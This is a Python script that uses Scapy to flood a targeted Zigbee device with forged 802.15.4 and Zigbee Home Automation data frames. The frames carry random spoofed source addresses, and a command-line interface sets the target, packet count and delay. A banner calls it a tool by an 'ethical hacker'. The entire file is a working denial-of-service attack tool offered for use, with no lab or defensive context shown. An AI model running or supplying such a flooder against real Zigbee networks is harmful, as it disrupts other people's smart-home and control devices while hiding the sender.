import argparse
import random
import time
from scapy.all import ZigbeeNWK, ZigbeeAppDataPayload, ZigbeeSecurityHeader, Dot15d4, Dot15d4Data, sendp
from scapy.layers.dot15d4 import Dot15d4FCS

# Banner
print("""
============================================================
       Zigbee Packet Flooder
       Coded by Pakistani Ethical Hacker: Mr Sabaz Ali Khan
============================================================
""")

def flood_zigbee_packets(interface, target_addr, count, interval):
    # Basic Zigbee packet construction
    for i in range(count):
        # Create 802.15.4 layer
        dot15d4 = Dot15d4FCS(
            fcf_frametype=1,  # Data frame
            fcf_destaddrmode=2,  # 16-bit short address
            fcf_srcaddrmode=2,  # 16-bit short address
            dest_panid=0x1234,
            dest_addr=target_addr,
            src_addr=random.randint(0x0000, 0xFFFF)  # Random source address
        )
        
        # Zigbee NWK layer
        nwk = ZigbeeNWK(
            frametype=0,  # Data
            protocolversion=2,
            destination=target_addr,
            source=random.randint(0x0000, 0xFFFF),
            radius=5,
            seqnum=i % 256
        )
        
        # Zigbee Application Data Payload
        app = ZigbeeAppDataPayload(
            aps_frametype=0,  # Data
            cluster=random.randint(0, 255),
            profile=0x0104,  # Zigbee Home Automation profile
            src_endpoint=1,
            dst_endpoint=1
        )
        
        # Combine layers
        packet = dot15d4 / nwk / app
        
        # Send packet
        sendp(packet, iface=interface, verbose=False)
        print(f"Sent packet {i+1}/{count} to {hex(target_addr)}")
        
        # Delay between packets
        time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="Zigbee Packet Flooder by Mr Sabaz Ali Khan")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., wlan0)")
    parser.add_argument("-t", "--target", required=True, help="Target Zigbee device address (hex, e.g., 0x1234)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of packets to send (default: 100)")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between packets in seconds (default: 0.1)")
    
    args = parser.parse_args()
    
    target_addr = int(args.target, 16) if args.target.startswith("0x") else int(args.target)
    
    print(f"Starting Zigbee packet flood on interface {args.interface}")
    print(f"Target address: {hex(target_addr)}")
    print(f"Sending {args.count} packets with {args.delay}s delay")
    
    try:
        flood_zigbee_packets(args.interface, target_addr, args.count, args.delay)
        print("Flooding completed.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()